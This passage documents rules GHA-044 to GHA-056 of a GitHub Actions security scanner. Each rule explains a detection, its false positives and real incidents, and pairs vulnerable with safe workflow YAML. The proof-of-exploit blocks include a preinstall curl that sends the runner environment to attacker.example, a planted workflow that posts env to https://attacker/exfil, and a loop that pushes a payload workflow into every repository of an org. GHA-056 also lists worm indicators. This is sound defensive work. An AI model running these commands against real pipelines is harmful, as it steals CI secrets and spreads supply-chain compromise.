**Recommendation.** Don't run install / build commands under ``pull_request_target`` or ``workflow_run`` against a tree that may be PR-controlled. Split the workflow: keep the privileged work on ``push`` / ``release`` (no fork content), and run untrusted builds in a separate ``pull_request`` workflow with no secrets and a read-only ``GITHUB_TOKEN``. If you must build PR code with secrets, do it inside a container with no network egress and a minimal filesystem, never directly on the runner.

**Known false positives.**

- Workflows that pin the workspace to a trusted ref before invoking the build tool (``actions/checkout`` with no ``ref:`` override on ``pull_request_target``, or a fresh checkout of a default-branch SHA) aren't actually exposed. The rule fires on the build-tool invocation alone; suppress with a ``.pipelinecheckignore`` rationale when the workspace is provably clean.

**Seen in the wild.**

- Trail of Bits ``Public PPE`` write-up (2022): demonstrated the primitive against ``pull_request_target`` workflows that ran ``npm install`` after checking out PR content. The PR-supplied ``preinstall`` script ran with the base repo's secrets in scope. Same shape with ``pip install -e .`` (setup.py) and ``make`` (Makefile).
- Cycode / Legit Security ``Poisoned Pipeline Execution`` research (2022-2023) catalogued dozens of OSS repos where a privileged-trigger workflow's build step executed PR-controlled config: ``setup.py``'s ``cmdclass``, ``build.gradle``'s ``init.gradle``, ``pom.xml``'s ``<build><plugins>``. The fix pattern is always: don't build untrusted code with secrets in scope.

**Proof of exploit.**

```
# Vulnerable: pull_request_target + npm install.
name: pr-build
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install         # executes package.json scripts

# Attack: PR ships a tampered package.json with:
#
#   "scripts": {
#     "preinstall": "curl -X POST https://attacker.example/x \
#       -d \"$(env | base64 -w0)\""
#   }
#
# ``npm install`` runs ``preinstall`` before resolving any
# dependency, so the exfil fires the moment the workflow
# starts. Same shape with pip install -e . (runs setup.py),
# make (runs Makefile), mvn (runs pom.xml plugins), gradle
# (runs init scripts), cargo build (runs build.rs).

# Safe: split the workflow. Privileged labeler runs on
# pull_request_target with secrets but never installs the
# PR. The build runs on pull_request with no secrets:
name: build
on: { pull_request: {} }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: npm install         # no secrets in scope
```

**Source:** [`GHA-044`](../providers/github.md#gha-044) in the [GitHub Actions provider](../providers/github.md).

### `GHA-045`: Caller-controlled ref input feeds actions/checkout <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-045 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** ``workflow_dispatch`` / ``workflow_call`` inputs land in ``${{ inputs.<name> }}``. Feeding that directly into the ``ref:`` of ``actions/checkout`` means the caller picks which commit runs in this workflow's privileged context (secrets, ``GITHUB_TOKEN``, environment approvals already satisfied). The callee can't tell whether the ref points at a vetted branch, a private fork's tip, or an attacker-controlled SHA. The rule fires on ``ref:`` values whose expression resolves to an ``inputs.*`` reference, walking any ``${{ ... }}`` expression that names an input field.

**Recommendation.** Validate the ``ref`` input against an allow-list (a regex for ``refs/heads/release-*``, an explicit set of permitted tags, or a 40-char SHA match) BEFORE passing it to ``actions/checkout``. If the workflow only needs to build release tags, hard-code the ref or derive it from ``github.event.release.tag_name`` (still attacker-influenced, but at least scoped to a release event). For reusable workflows, document that the callee assumes callers have already validated the ref, and pin every caller to a known list of refs.

**Known false positives.**

- Reusable workflows that ARE the trust boundary (the callee is documented as the authoritative checkout entrypoint and every caller is internal / pinned by SHA) accept this shape by design. The rule still surfaces these so the author can document the contract in a ``.pipelinecheckignore`` rationale; suppress with the caller-list cite.

**Seen in the wild.**

- Snyk ``GitHub Actions abuse via workflow_dispatch`` research (2023) showed reusable build workflows that accepted a ``ref`` input and checked it out without validation. An attacker with workflow_dispatch permission (commonly granted to broader sets of actors than push) pointed the checkout at a fork SHA and exfiltrated the production deploy credentials.

**Proof of exploit.**

```
# Vulnerable: caller picks the ref.
name: build-release
on:
  workflow_dispatch:
    inputs:
      ref:
        description: 'Tag or branch to build'
        required: true
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ inputs.ref }}      # caller controls
      - run: make release
        env:
          SIGNING_KEY: ${{ secrets.RELEASE_SIGNING_KEY }}

# Attack: any actor with workflow_dispatch permission opens
# the API and dispatches with ``ref: refs/pull/123/head`` (a
# fork PR). The privileged workflow checks out the attacker-
# controlled tree and runs ``make release`` with the signing
# key in scope. No code review, no PR merge — one API call.

# Safe: validate the ref before use.
      - name: Validate ref
        run: |
          case "$REF" in
            refs/tags/v*) ;;
            *) echo "refusing $REF"; exit 1 ;;
          esac
        env:
          REF: ${{ inputs.ref }}
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ inputs.ref }}
```

**Source:** [`GHA-045`](../providers/github.md#gha-045) in the [GitHub Actions provider](../providers/github.md).

### `GHA-046`: Manual PR-head fetch on untrusted-trigger workflow <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-046 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** GHA-002 catches ``actions/checkout`` with ``ref: ${{ github.event.pull_request.head.sha }}``. The same primitive shows up as ``gh pr checkout``, ``git fetch origin pull/<N>/head``, and ``git checkout`` of an attacker-controlled SHA expression inside a ``run:`` block. They all land the same bytes in the workspace with the same privileged context active, so they get the same severity.

**Recommendation.** Don't materialize the PR head in a ``pull_request_target`` or ``workflow_run`` job. If you need to inspect PR content, split the workflow: a privileged half (with secrets) that uses metadata only (PR number, base ref, label) and an unprivileged ``pull_request`` half that builds the code with no secrets in scope.

**Known false positives.**

- Workflows that fetch the PR head purely to *inspect metadata* (``git fetch origin pull/N/head && git log -1 FETCH_HEAD --format=%s``) and never run code from the fetched tree still trigger the rule, because the fetch primitive is the structural signal. The rule has no way to confirm the workspace bytes are never executed. Suppress per-workflow via ``--ignore-file`` once you've verified no ``run:`` / ``uses: ./`` step consumes the checked-out tree; the safer pattern is still to read PR metadata via the GitHub API rather than materializing the head ref.

**Seen in the wild.**

- GitHub Security Lab: [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) (2020) listed manual ``git fetch pull/<N>/head`` as one of the equivalent ways teams shoot themselves in the foot. Auditors checking only ``actions/checkout`` miss the shell-level variants entirely.

**Proof of exploit.**

```
# Vulnerable: pull_request_target + gh pr checkout.
name: triage
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  test-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # base, looks safe
      - run: gh pr checkout ${{ github.event.number }}
        env:
          GH_TOKEN: ${{ github.token }}
      - run: make test           # now runs PR Makefile

# Attack: same as GHA-002. The PR ships a Makefile that
# exfils $GITHUB_TOKEN and every ${{ secrets.* }} the
# pull_request_target context exposes. GHA-002's pattern
# match never fires because ``actions/checkout`` looks
# innocent, the PR content lands via the shell instead.

# Safe: don't materialize PR content with secrets active.
# Move the build to a pull_request workflow:
name: build
on: { pull_request: {} }
jobs:
  test-pr:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>     # PR head, no secrets
      - run: make test
```

**Source:** [`GHA-046`](../providers/github.md#gha-046) in the [GitHub Actions provider](../providers/github.md).

### `GHA-047`: Action ref resolves to a recently committed tag or SHA <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-047 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Reads ``ref_committed_at`` from ``ctx.action_metadata[owner/repo]`` (populated by the ``--resolve-remote`` path via ``GET /repos/{owner}/{repo}/commits/{ref}``). Fires when the referenced ref's commit date is younger than ``MIN_REF_AGE_DAYS`` (7). Trusted publishers (``actions``, ``aws-actions``, ``azure``, ...) are skipped by default to avoid firing on legitimate retags of floating majors; pin to a SHA to opt those back in. Without ``--resolve-remote`` the rule passes silently with a discovery nudge.

**Recommendation.** Wait until the referenced tag or commit has had time to be reviewed by the upstream community before pulling it into CI. The default cooldown is seven days. Either bump the pinned ref to an older release, or wait 7 days and re-run. If the action is internal / first-party and the freshness gate is unwanted, pin to a 40-char commit SHA — SHA pins don't move under a retag and are the preferred long-term mitigation.

**Known false positives.**

- A legitimate first-party action that's outside the default trusted-publisher allowlist (a small vendor org that publishes a real action; you'd like it included) will fire after every release for the cooldown window. Either pin to a SHA (preferred) or suppress via ignore-file with a dated note; the suppression decays once the ref ages past the threshold.

**Seen in the wild.**

- Multiple action-tag compromises (ua-parser-js npm 2021, tj-actions/changed-files 2025) followed the same shape: a tag was re-pointed at a malicious commit and consumers pulling on the next CI run executed the payload. Cooldown gating turns the community-detection window into a defense.

**Source:** [`GHA-047`](../providers/github.md#gha-047) in the [GitHub Actions provider](../providers/github.md).

### `GHA-048`: Workflow step writes a file under .github/workflows/ <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-048 }

**Evidences:** [`ESF-D-TAMPER`](#ctrl-esf-d-tamper) Protect build artifacts from tampering and detect unauthorized modification.

**How this is detected.** Fires when a ``run:`` body writes a file path containing ``.github/workflows/`` via shell redirect (``>``, ``>>``), ``tee``, ``cp`` / ``mv``, heredoc, ``cat <<EOF >``, or a templating tool (``envsubst``, ``yq -i``, ``sed -i``). The rule also fires on a ``uses:`` of a third-party action whose documented behavior is workflow file generation (anything matching ``stefanzweifel/git-auto-commit`` paired with a ``.github/workflows`` argument). The single Shai-Hulud worm (2026) propagated via this exact pattern: a postinstall script wrote ``.github/workflows/shai-hulud-workflow.yml`` into every repo the stolen ``GITHUB_TOKEN`` could push to.

Distinct from GHA-019 (token-to-file persistence) and GHA-049 (cross-repo push): GHA-048 catches the *content* (a workflow file is written somewhere on the runner), GHA-049 catches the *push* (the runner's git remote is a repo other than the one under test).

**Recommendation.** Remove the step that writes into ``.github/workflows/``. A workflow that authors a sibling workflow is the canonical worm-propagation primitive: the new file runs on the next matching trigger with the repo's GITHUB_TOKEN. There is no legitimate non-automation reason for an in-CI step to write workflow YAML; bot-style automation (release-please, Renovate) should be moved to an external account whose token is scoped, audited, and not the runner's ``GITHUB_TOKEN``. If the write is a templated scaffold (``cookiecutter`` for a new repo), do it in a separate, environment-gated job and ensure the target is never the same repo's workflows dir.

**Known false positives.**

- Workflow-bootstrap repos (``cookiecutter-gh-action``, internal scaffolding for new microservices) legitimately scaffold ``.github/workflows/`` files. The right scope is a single, well-named step in an environment-gated job; suppress on that specific step with a rationale that names the destination repo and the gating environment.
- Bot accounts that legitimately republish workflow files (``release-please-action`` updating its own manifest) are narrow allow-list candidates rather than blanket suppression targets.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the malicious postinstall script in compromised packages used the runner's GITHUB_TOKEN to push ``.github/workflows/shai-hulud-workflow.yml`` into the victim's repos. On the next push trigger the worm ran with fresh token scope, repeating the propagation step against every repo the token could reach.

**Proof of exploit.**

```
# Vulnerable: a build step writes a sibling workflow file.
# After the next push to the default branch, the new
# workflow runs with the repo's permissions and propagates.
jobs:
  build:
    permissions: { contents: write }
    steps:
      - uses: actions/checkout@<sha>
      - run: npm ci
      - run: |
          # postinstall-driven worm pattern:
          cat > .github/workflows/shai-hulud.yml <<'EOF'
          name: shai-hulud
          on: push
          jobs:
            spread:
              runs-on: ubuntu-latest
              steps:
                - run: curl -d @<(env) https://attacker/exfil
          EOF
          git add .github/workflows/shai-hulud.yml
          git commit -m 'ci: add lint workflow'
          git push

# Safe: never author workflow YAML from inside another
# workflow. Scaffold via an external bootstrapping job
# that runs outside the runner's GITHUB_TOKEN scope.
```

**Source:** [`GHA-048`](../providers/github.md#gha-048) in the [GitHub Actions provider](../providers/github.md).

### `GHA-049`: Workflow step pushes to a repo outside the current owner <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-049 }

**Evidences:** [`ESF-C-LEAST-PRIV`](#ctrl-esf-c-least-priv) Apply least-privilege to CI/CD service roles and pipelines.

**How this is detected.** Three shapes are detected in ``run:`` bodies:

1. ``git push`` to a remote whose URL is interpolated from an expression (``${{ ... }}``), an env var (``$VAR``), or is not the canonical ``origin`` / ``upstream``;
2. ``gh repo create`` / ``gh repo edit`` / ``gh repo transfer`` / ``gh api /repos/...`` whose target owner is parameterized;
3. ``gh release create`` / ``gh release upload`` against a repo specified via ``-R <owner>/<repo>`` where the value is parameterized rather than a literal allow-list entry.

Pairs with GHA-048 (self-mutation, which catches the *write* into ``.github/workflows/`` of a sibling workflow): GHA-049 catches the *push* primitive that lets a worm leave the current repo. Together they cover both halves of the Shai-Hulud propagation step.

**Recommendation.** Don't push from CI to a repository whose owner is supplied by an unvetted source (an env var, a workflow input, an interpolated PR field, or a step output). Cross-repo writes from CI are the second leg of the Shai-Hulud propagation loop, the worm uses the runner's GITHUB_TOKEN (or a stolen PAT) to ``git push`` or ``gh repo create`` against every repo the token can reach. If the workflow truly needs to push to an external repo, bind the step to a protected ``environment:`` and pin the destination to a literal ``owner/repo`` string.

**Known false positives.**

- Mirror jobs (push to ``github.com/<our-org>/<mirror>``), monorepo release jobs that push to a publishing org, and release-please-style automation legitimately push to a different repo. Suppress on the specific step name with a rationale that names the literal target. The rule does NOT fire on ``git push origin <ref>`` or ``git push upstream <ref>`` where the remote URL is otherwise unspecified.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the propagation loop combined a stolen GITHUB_TOKEN with ``gh repo create`` plus ``git push`` to seed ``shai-hulud-workflow.yml`` into every repo the token could reach. Without the cross-repo push primitive the worm cannot leave the first infected runner.

**Proof of exploit.**

```
# Vulnerable: every repo the token can write to becomes a
# propagation target on the next push trigger.
jobs:
  spread:
    permissions: { contents: write, administration: write }
    steps:
      - uses: actions/checkout@<sha>
      - run: |
          for repo in $(gh repo list "$ORG" --json name -q '.[].name'); do
            gh repo clone "$ORG/$repo" "/tmp/$repo"
            cp payload.yml "/tmp/$repo/.github/workflows/lint.yml"
            git -C "/tmp/$repo" add .github/workflows/lint.yml
            git -C "/tmp/$repo" commit -m 'ci: add lint workflow'
            git -C "/tmp/$repo" push origin main
          done

# Safe: cross-repo pushes only from an environment-gated job
# pinned to a literal destination, with a fine-scoped PAT
# (not the workflow's GITHUB_TOKEN).
jobs:
  mirror:
    environment: mirror-protected
    permissions: { contents: read }
    steps:
      - run: git push https://x-access-token:${{ secrets.MIRROR_PAT }}@github.com/our-org/our-mirror.git main
```

**Source:** [`GHA-049`](../providers/github.md#gha-049) in the [GitHub Actions provider](../providers/github.md).

### `GHA-050`: Publish step relies on long-lived registry token <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-050 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Fires when a step matches a known package-publish primitive AND the job has no protected ``environment:`` AND the step references a long-lived registry secret. Publish primitives covered:

- ``run: npm publish`` / ``pnpm publish`` / ``yarn publish``
- ``run: twine upload`` / ``run: poetry publish`` / ``run: uv publish``
- ``run: gem push`` / ``run: cargo publish``
- ``uses: pypa/gh-action-pypi-publish`` with a ``password`` input (the trusted-publisher path leaves ``password`` unset);
- ``uses: JS-DevTools/npm-publish`` with a ``token`` input.

Long-lived secret heuristic: the step's ``env:`` or ``with:`` block references ``NPM_TOKEN``, ``NODE_AUTH_TOKEN``, ``PYPI_TOKEN``, ``TWINE_PASSWORD``, ``POETRY_PYPI_TOKEN``, ``RUBYGEMS_API_KEY``, or ``CARGO_REGISTRY_TOKEN`` from ``secrets.*``. A job that already binds to a protected ``environment:`` passes regardless, because the environment's required-reviewers / branch-rule controls compensate for the static credential.

Pairs with GHA-030 (cloud OIDC trust). GHA-030 covers the cloud-credentials exchange; GHA-050 covers the package registry side.

**Recommendation.** Replace long-lived publish tokens with OIDC trusted-publisher flows and bind the publish job to a protected ``environment:``. Concretely:

- **PyPI**: use ``pypa/gh-action-pypi-publish`` with PEP 740 trusted publishing (no ``password`` input); the GHA OIDC token is exchanged at PyPI for a short-lived upload token.
- **npm**: use ``--provenance`` on ``npm publish`` from a job that requests ``id-token: write`` (npm provenance, GA 2024); drop ``NODE_AUTH_TOKEN`` / ``NPM_TOKEN`` from the env block where possible.
- **GHCR / ECR / GAR**: prefer ``configure-aws-credentials`` with ``role-to-assume`` (or the Azure / GCP equivalent), not static registry passwords.
- Add ``environment: <protected-name>`` to the publish job so branch restrictions and required reviewers apply.

A long-lived ``NPM_TOKEN`` is the fuel a Shai-Hulud-shaped worm needs: once stolen from any runner it can publish more compromised packages on the org's behalf. OIDC tokens expire in minutes and are scoped to the run that requested them.

**Known false positives.**

- Private / internal registries that don't support OIDC (legacy Artifactory, self-hosted Nexus without OIDC broker) require a static token. The right response is ``environment:`` gating with required reviewers on the publish job; suppress this rule with a rationale that names the protected environment.
- First-publish bootstrap of a new package (npm and PyPI both require an initial manual publish before trusted-publisher can be wired). The rule fires; suppress on the specific step until the trusted-publisher record is in place.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the worm's self-propagation step scraped ``NPM_TOKEN`` from runner env / ``~/.npmrc`` and used it to ``npm publish`` patch versions of other packages the maintainer's account owned. Provenance + OIDC + environment gating turn that step into a no-op: the OIDC token doesn't survive the run, and an environment-gated publish requires a human reviewer.
- TanStack / Mistral compromises (May 2026): same shape, mass publish of poisoned versions using maintainer credentials. An environment gate on the publish job would have stopped the unattended release.

**Proof of exploit.**

```
# Vulnerable: long-lived NPM_TOKEN, no environment gate. Any
# postinstall in a transitive dep reaches the token via the
# step env and can re-publish other packages the token can
# reach.
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with: { registry-url: 'https://registry.npmjs.org' }
      - run: npm ci && npm publish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}

# Safe: OIDC trusted-publisher + provenance + environment
# gate. The publish job requires a deployment approval; the
# upload uses a short-lived OIDC token; the tarball is
# signed with provenance metadata npm verifies on install.
jobs:
  release:
    runs-on: ubuntu-latest
    environment: npm-publish        # required reviewers
    permissions:
      contents: read
      id-token: write               # OIDC
    steps:
      - uses: actions/checkout@<sha>
      - uses: actions/setup-node@<sha>
        with: { registry-url: 'https://registry.npmjs.org' }
      - run: npm ci --ignore-scripts
      - run: npm publish --provenance --access public
```

**Source:** [`GHA-050`](../providers/github.md#gha-050) in the [GitHub Actions provider](../providers/github.md).

### `GHA-051`: services / container image is not pinned by digest <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gha-051 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Walks ``jobs.<id>.services.<name>.image`` and ``jobs.<id>.container.image`` (the two places a GitHub-hosted runner pulls a third-party image at job start). Flags any reference that isn't pinned by ``@sha256:<digest>``: bare tags (``postgres:16``), ``latest``, no-tag (``redis``), and ``mcr.microsoft.com/dotnet/sdk:8.0``-style tag pins all fail.

Complements DF-001 (Dockerfile ``FROM`` pinning), GHA-001 (action ``uses:`` pinning), and GHA-040 (known-compromised action refs). Where those catch your own code pulling a third party, GHA-051 catches the *runner* pulling a third-party image to host the workflow alongside your code — same trust shape, different ingress.

**Recommendation.** Replace every ``services.<name>.image:`` (and the same field on a job-level ``container:`` block) with a ``<image>@sha256:<digest>`` reference. The services / container runs alongside the workflow on the same runner and sees the same secret environment, so a swapped sidecar image is the same shape of attack as a swapped action: arbitrary code on the runner under the workflow's identity. Use a registry that returns immutable digests (``docker buildx imagetools inspect`` resolves a tag to a digest), pin to that digest, then re-pin on the next intentional upgrade — exactly the workflow GHA-001 already documents for ``uses: actions/...@<sha>``.

**Known false positives.**

- Workflows that pull from an org-internal private registry where the registry itself enforces image immutability sometimes pin by tag deliberately. The safer pattern is still ``@sha256:``: the registry's immutability is a separate trust boundary you'd need to audit, while a digest pin is self-verifying. Suppress with a rationale that names the registry and the audit channel.

**Source:** [`GHA-051`](../providers/github.md#gha-051) in the [GitHub Actions provider](../providers/github.md).

### `GHA-052`: actions/cache key includes untrusted PR-controllable input <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-052 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Walks every step using ``actions/cache@*`` (or the ``cache-save`` / ``cache-restore`` variants) and checks ``with.key:`` (plus ``with.restore-keys:``) for references to attacker-controllable expression contexts: ``github.head_ref``, ``github.event.pull_request.*``, ``github.event.issue.*``, ``github.event.comment.*``, and the actor / sender fields when used in a key.

Pairs with GHA-027 (``pull_request_target`` on untrusted input) and GHA-046 (manual PR-head fetches on untrusted triggers): the same set of expression contexts that flow into a shell are also the contexts that flow into cache key construction. References to ``github.ref`` / ``github.ref_name`` / ``runner.os`` / ``hashFiles(...)`` are safe and pass.

**Recommendation.** Build the cache key from values an attacker cannot control. ``hashFiles('**/package-lock.json')`` and the like are safe — the hash changes only when the tracked files change, which is itself the trust signal. Avoid ``github.head_ref``, ``github.event.pull_request.*``, ``github.event.issue.*``, and any ``inputs.*`` whose value can be set by a ``workflow_dispatch`` from an untrusted actor.

The attack is cache poisoning: an attacker opens a PR whose branch name (``head_ref``) is crafted so that ``actions/cache`` stores a malicious payload under a key that a subsequent privileged run (e.g., on ``main``) consumes. The next run hits the poisoned cache, executes the attacker's code under the trusted workflow's permissions, and the original PR never has to be merged. Pin keys to ``hashFiles`` of lockfiles or branch-restricted ``github.ref_name`` (post-checkout, only commits already in the trusted branch generate that ref name).

**Known false positives.**

- Some workflows legitimately scope cache keys per feature branch by including ``github.head_ref`` in a ``pull_request`` workflow where the cache is segmented by ref (so cross-branch poisoning is impossible). The right pattern is to prefix the key with a non-attacker-controllable namespace AND rely on ``restore-keys`` only for read-fallback. Suppress on the specific step with a rationale that documents the namespacing.

**Source:** [`GHA-052`](../providers/github.md#gha-052) in the [GitHub Actions provider](../providers/github.md).

### `GHA-053`: if: predicate evaluates attacker-controllable context as expression <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-053 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Scans every job-level and step-level ``if:`` for references to attacker-controllable expression contexts: ``github.event.head_commit.message``, ``github.event.pull_request.title``, ``...body``, ``...head.ref``, ``github.head_ref`` (the top-level shorthand for the same PR source-branch name), ``github.event.issue.title`` / ``...body``, ``github.event.comment.body``, ``github.event.review_comment.body``, ``github.event.review.body``.

Safe contexts (``github.ref``, ``github.ref_name``, ``github.actor``, ``github.repository``, ``github.event_name``) are not flagged — those are set by GitHub, not by the actor. ``inputs.*`` references are also safe by convention; the trigger channel that supplies them is a separate trust boundary the workflow author controls.

Complements GHA-002 (``run:`` body interpolating untrusted context — same source set, shell sink) and GHA-052 (cache key derived from untrusted context — same source set, cache sink). GHA-053 closes the third sink: the expression evaluator itself.

**Recommendation.** Compare against safe context keys (``github.ref``, ``github.actor``, ``github.repository``) and check the untrusted input via a step output rather than a direct ``if:`` reference. Concretely: read the attacker-controllable field into a step output first, then use ``if: steps.gate.outputs.is_release == 'true'`` rather than ``if: contains(github.event.head_commit.message, '[release]')``. The shape difference is subtle but decisive: GitHub passes the ``if:`` string through its expression evaluator, which means certain payloads in the untrusted value (single-quote injection, nested ``${{ }}``) execute as expression syntax rather than matching as a literal. Routing through a step output forces the value to land in a shell variable first, where the runner's normal quoting protects it.

Documented attack: a PR title of ``${{ secrets.X }}`` inside an ``if: contains(github.event.pull_request.title, ...)`` predicate evaluates the ``secrets.X`` reference instead of comparing it as a literal, exfiltrating the secret into the workflow's conditional decision and from there into logs.

**Known false positives.**

- A workflow that legitimately gates on the existence of certain text in the commit message (release automation) and is invoked only via ``workflow_dispatch`` from a trusted actor isn't exposed to the attack. The right pattern is still to route through a step output for clarity; suppress on the specific job/step when the trigger channel itself enforces the trust boundary.

**Source:** [`GHA-053`](../providers/github.md#gha-053) in the [GitHub Actions provider](../providers/github.md).

### `GHA-054`: actions/checkout with ssh-key persists SSH credential in repo <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-054 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Walks every step with ``uses: actions/checkout@*`` and checks the ``with:`` block. Fires when both:

* ``with.ssh-key`` is set (any value — ``${{ secrets.  X }}`` is the typical shape), AND
* ``with.persist-credentials`` is not explicitly set   to ``false`` (the default behavior is ``true``).

Complements GHA-037 (ArtiPacked / persist-credentials on token-based checkouts). Where GHA-037 catches the ``GITHUB_TOKEN`` persistence shape, GHA-054 catches the SSH-deploy-key persistence shape — same risk, different credential type.

**Recommendation.** Set ``with: persist-credentials: false`` on every ``actions/checkout`` step that also passes ``ssh-key:`` from a secret. With ``persist-credentials: true`` (the default), the checkout action writes the SSH key into ``.git/config`` of the checked-out repo and configures the local repo to use that key for subsequent ``git`` invocations. Any later step in the same job that runs untrusted code (a build script, a test fixture, a postinstall) inherits the credential via the repo's git config — same shape as the ``ArtiPacked`` family GHA-037 catches for ``GITHUB_TOKEN``.

The safe pattern: ``actions/checkout@<sha>`` with ``ssh-key: ${{ secrets.DEPLOY_KEY }}`` AND ``persist-credentials: false``. The action uses the key for the initial clone, then unsets it; subsequent steps don't have access. If you actually need to ``git push`` later in the job using the same key, re-configure with ``GIT_SSH_COMMAND`` in just that step rather than globally.

**Known false positives.**

- Workflows that genuinely need the SSH key to remain available in the repo (a single-job pipeline that clones, builds, and pushes back to the same repo using the same key) sometimes set ``persist-credentials: true`` deliberately. The safer pattern is to split the push into a separate job whose ``actions/checkout`` re-clones with the same key but without persist; or use a fine-grained PAT for the push step. Suppress with a rationale that names the single-job constraint.

**Source:** [`GHA-054`](../providers/github.md#gha-054) in the [GitHub Actions provider](../providers/github.md).

### `GHA-055`: Reusable workflow outputs derive a secret or caller-input value <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gha-055 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Scans ``on.workflow_call.outputs.<name>.value:`` for ``${{ secrets.* }}`` references (and also the ``${{ inputs.* }}`` shape when the caller can pass secrets through). Skips workflows that don't declare ``on.workflow_call`` — only reusable workflows have outputs that propagate across the workflow boundary.

Complements GHA-019 (token-to-file persistence) and GHA-033 (secret echoed in ``run:``) — both catch a secret leaking via the *log* surface. GHA-055 closes the third surface: the workflow boundary itself, where a reusable workflow's outputs cross into the caller's context without masking.

**Recommendation.** Remove every ``${{ secrets.* }}`` and ``${{ inputs.* }}`` reference from the ``on.workflow_call.outputs.<name>.value:`` field. A reusable workflow's outputs are visible to the caller as ordinary job outputs (``needs.<job>.outputs.*``), which means: the secret value gets written into the caller's build log when the caller references the output, it gets persisted to the workflow run's summary, and any cross-job ``needs`` chain in the caller propagates it further. GitHub's secret-masking layer only redacts the value in the *defining* workflow's logs; once the value crosses the workflow boundary via ``outputs:``, the masking doesn't follow. The ``inputs.*`` route is the indirect form: a caller wires ``with: x: ${{ secrets.X }}`` into one of the reusable workflow's inputs, and re-emitting that input as an output crosses the same boundary with the same loss-of-masking outcome.

If the caller genuinely needs information derived from a secret (e.g., a build artifact name incorporating a tenant id), derive the non-secret transform on the callee side first (``echo "name=$(echo \$SECRET | sha256sum | cut -d' ' -f1)" >> $GITHUB_OUTPUT``) and emit only the transformed value. The reusable workflow's outputs should never contain raw secret bytes or caller-controlled input bytes.

**Known false positives.**

- A reusable workflow that emits a *hash* of a secret (``sha256(secret)``) as an output is not the same risk shape — the original secret is not recoverable. The rule errs on the side of flagging any direct ``${{ secrets.* }}`` / ``${{ inputs.* }}`` substring in the output value; suppress when the value is provably a one-way transform.

**Source:** [`GHA-055`](../providers/github.md#gha-055) in the [GitHub Actions provider](../providers/github.md).

### `GHA-056`: Workflow body contains a known supply-chain worm indicator <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-gha-056 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Distinct from GHA-027 (which fires on behavioral primitives, reverse shells, base64-decoded exec, exfil-channel domains) and from GHA-048 / GHA-049 (which fire on the *write* or *push* primitives). GHA-056 fires on the *literal IOC* — the filenames, repo names, and webhook UUIDs that surfaced in the published worm payloads. Currently covers:

* ``shai-hulud-workflow.yml`` — the workflow file the Shai-Hulud worm dropped into every writable repo.
* Webhook UUID ``bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`` — the Shai-Hulud webhook.site collector path.
* ``Shai-Hulud`` / ``Shai-Hulud Migration`` — the public exfil repo names the worm created under each victim's account.
* ``s1ngularity-repository*`` — the Nx-attack public exfil repo name pattern.

The IOC list is curated and append-only, mirroring the shape of ``_compromised_actions.py`` / ``_compromised_packages.py``. Refresh by PR with the vendor advisory cited in the commit.

